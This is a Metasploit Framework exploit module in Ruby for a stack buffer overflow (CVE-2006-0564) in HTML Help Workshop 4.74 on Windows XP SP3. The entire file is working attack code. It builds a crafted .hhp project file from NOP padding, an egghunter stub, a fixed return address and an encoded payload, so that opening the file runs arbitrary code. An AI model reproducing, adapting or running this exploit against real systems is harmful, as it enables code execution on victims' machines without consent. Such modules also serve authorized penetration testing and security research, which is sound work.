##
# $Id: hhw_hhp_contentfile_bof.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HTML Help Workshop 4.74 (hhp Project File) Buffer Overflow Exploit',
			'Description'    => %q{
					This module exploits a stack buffer overflow in HTML Help Workshop 4.74
					By creating a specially crafted hhp file, an an attacker may be able
					to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'bratax', 'jduck' ],
			'Version'        => '$Revision: 10477 $',
			'References'     =>
				[
					[ 'CVE', '2006-0564' ],
					[ 'OSVDB', '22941' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/1470' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/1495' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x1a\x2f\x5c",
					'StackAdjustment' => -4800,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP English SP3', { 'Offset' => 280, 'Ret' => 0x00401F93 } ], # CALL EDI hhw.exe v4.74.8702.0
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Feb 06 2006',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME',   [ false, 'The file name.', 'msf.hhp']),
			], self.class)
	end

	def exploit

		# use the egghunter!
		eh_stub, eh_egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })

		off = target['Offset']
		idxf = ""
		idxf << make_nops(off - eh_stub.length)
		idxf << eh_stub
		idxf << [target.ret].pack('V')

		sploit = "[OPTIONS]\r\n"
		sploit << "Contents file="
		sploit << idxf
		sploit << "\r\n"
		sploit << "\r\n"
		sploit << "[FILES]\r\n"
		sploit << "\r\n"
		sploit << eh_egg

		hhp = sploit

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(hhp)
	end

end
